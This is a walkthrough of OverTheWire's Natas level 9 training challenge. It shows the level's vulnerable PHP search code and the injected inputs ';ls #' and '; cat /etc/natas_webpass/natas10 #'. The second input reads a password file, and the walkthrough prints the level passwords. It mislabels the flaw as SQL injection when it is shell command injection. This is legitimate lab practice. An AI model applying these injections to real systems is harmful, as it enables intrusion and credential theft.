# Natas Level 9

## 🧪 Credentials

- **URL**: `http://natas9.natas.labs.overthewire.org`
- **Username**: `natas9`
- **Password**: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

---

## 🖥️ Steps

1. Login to the website.
2. go for the source. here is the important part. `needle` is the variable which has our input secret. we see that here `passthru("grep -i $key dictionary.txt");` it uses the `$key` to search in the `dictionary.txt`. here is the problem this line of code `grep -i $key dictionary.txt` has a high-level security issue which still today happens alot. i won't deep dive into it cause it's a walkthrough. search `sql injection` in yt you'll know.  
```
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
3. let's say i submit a word like `dog` in the code it'll run `passthru("grep -i dog dictionary.txt");`. now i will submit `;ls #` and in the code it'll be like `passthru("grep -i ;ls # dictionary.txt");`. the `grep -i ;` part will do nothing. it'll run `ls` and the rest has been commented.
4. if you do as i said you'll see this output.
```
Output:

dictionary.txt
index-source.html
index.php
```
5. we know that the password are saved in the `/etc/natas_webpass` dir. so i'll run the `; cat /etc/natas_webpass/natas10 #` to get the pass.
```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
---
[← Level 08](./level08.md) | [Level 10 →](./level10.md)
